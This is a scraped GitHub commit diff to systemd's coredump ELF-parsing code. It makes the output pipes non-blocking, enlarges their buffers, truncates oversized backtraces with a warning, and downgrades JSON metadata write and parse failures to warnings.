|  |  | #define ELF\_PACKAGE\_METADATA\_ID 0xcafe1a7e |
|  |  |  |
|  |  | /\* The amount of data we're willing to write to each of the output pipes. \*/ |
|  |  | #define COREDUMP\_PIPE\_MAX (1024\*1024U) |
|  |  |  |
|  |  | static void \*dw\_dl = NULL; |
|  |  | static void \*elf\_dl = NULL; |
|  |  |  |
| Expand Down  Expand Up | | @@ -759,13 +762,13 @@ int parse\_elf\_object(int fd, const char \*executable, bool fork\_disable\_dump, cha |
|  |  | return r; |
|  |  |  |
|  |  | if (ret) { |
|  |  | r = RET\_NERRNO(pipe2(return\_pipe, O\_CLOEXEC)); |
|  |  | r = RET\_NERRNO(pipe2(return\_pipe, O\_CLOEXEC|O\_NONBLOCK)); |
|  |  | if (r < 0) |
|  |  | return r; |
|  |  | } |
|  |  |  |
|  |  | if (ret\_package\_metadata) { |
|  |  | r = RET\_NERRNO(pipe2(json\_pipe, O\_CLOEXEC)); |
|  |  | r = RET\_NERRNO(pipe2(json\_pipe, O\_CLOEXEC|O\_NONBLOCK)); |
|  |  | if (r < 0) |
|  |  | return r; |
|  |  | } |
| Expand Down  Expand Up | | @@ -809,8 +812,24 @@ int parse\_elf\_object(int fd, const char \*executable, bool fork\_disable\_dump, cha |
|  |  | goto child\_fail; |
|  |  |  |
|  |  | if (buf) { |
|  |  | r = loop\_write(return\_pipe[1], buf, strlen(buf), false); |
|  |  | if (r < 0) |
|  |  | size\_t len = strlen(buf); |
|  |  |  |
|  |  | if (len > COREDUMP\_PIPE\_MAX) { |
|  |  | /\* This is iffy. A backtrace can be a few hundred kilobytes, but too much is |
|  |  | \* too much. Let's log a warning and ignore the rest. \*/ |
|  |  | log\_warning("Generated backtrace is %zu bytes (more than the limit of %u bytes), backtrace will be truncated.", |
|  |  | len, COREDUMP\_PIPE\_MAX); |
|  |  | len = COREDUMP\_PIPE\_MAX; |
|  |  | } |
|  |  |  |
|  |  | /\* Bump the space for the returned string. |
|  |  | \* Failure is ignored, because partial output is still useful. \*/ |
|  |  | (void) fcntl(return\_pipe[1], F\_SETPIPE\_SZ, len); |
|  |  |  |
|  |  | r = loop\_write(return\_pipe[1], buf, len, false); |
|  |  | if (r == -EAGAIN) |
|  |  | log\_warning("Write failed, backtrace will be truncated."); |
|  |  | else if (r < 0) |
|  |  | goto child\_fail; |
|  |  |  |
|  |  | return\_pipe[1] = safe\_close(return\_pipe[1]); |
| Expand All | | @@ -819,13 +838,19 @@ int parse\_elf\_object(int fd, const char \*executable, bool fork\_disable\_dump, cha |
|  |  | if (package\_metadata) { |
|  |  | \_cleanup\_fclose\_ FILE \*json\_out = NULL; |
|  |  |  |
|  |  | /\* Bump the space for the returned string. We don't know how much space we'll need in |
|  |  | \* advance, so we'll just try to write as much as possible and maybe fail later. \*/ |
|  |  | (void) fcntl(json\_pipe[1], F\_SETPIPE\_SZ, COREDUMP\_PIPE\_MAX); |
|  |  |  |
|  |  | json\_out = take\_fdopen(&json\_pipe[1], "w"); |
|  |  | if (!json\_out) { |
|  |  | r = -errno; |
|  |  | goto child\_fail; |
|  |  | } |
|  |  |  |
|  |  | json\_variant\_dump(package\_metadata, JSON\_FORMAT\_FLUSH, json\_out, NULL); |
|  |  | r = json\_variant\_dump(package\_metadata, JSON\_FORMAT\_FLUSH, json\_out, NULL); |
|  |  | if (r < 0) |
|  |  | log\_warning\_errno(r, "Failed to write JSON package metadata, ignoring: %m"); |
|  |  | } |
|  |  |  |
|  |  | \_exit(EXIT\_SUCCESS); |
| Expand Down  Expand Up | | @@ -860,7 +885,7 @@ int parse\_elf\_object(int fd, const char \*executable, bool fork\_disable\_dump, cha |
|  |  |  |
|  |  | r = json\_parse\_file(json\_in, NULL, 0, &package\_metadata, NULL, NULL); |
|  |  | if (r < 0 && r != -ENODATA) /\* ENODATA: json was empty, so we got nothing, but that's ok \*/ |
|  |  | return r; |
|  |  | log\_warning\_errno(r, "Failed to read or parse json metadata, ignoring: %m"); |
|  |  | } |
|  |  |  |
|  |  | if (ret) |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `076b807`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsystemd%2Fsystemd%2Fcommit%2F076b807be472630692c5348c60d0c2b7b28ad437) to comment.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.


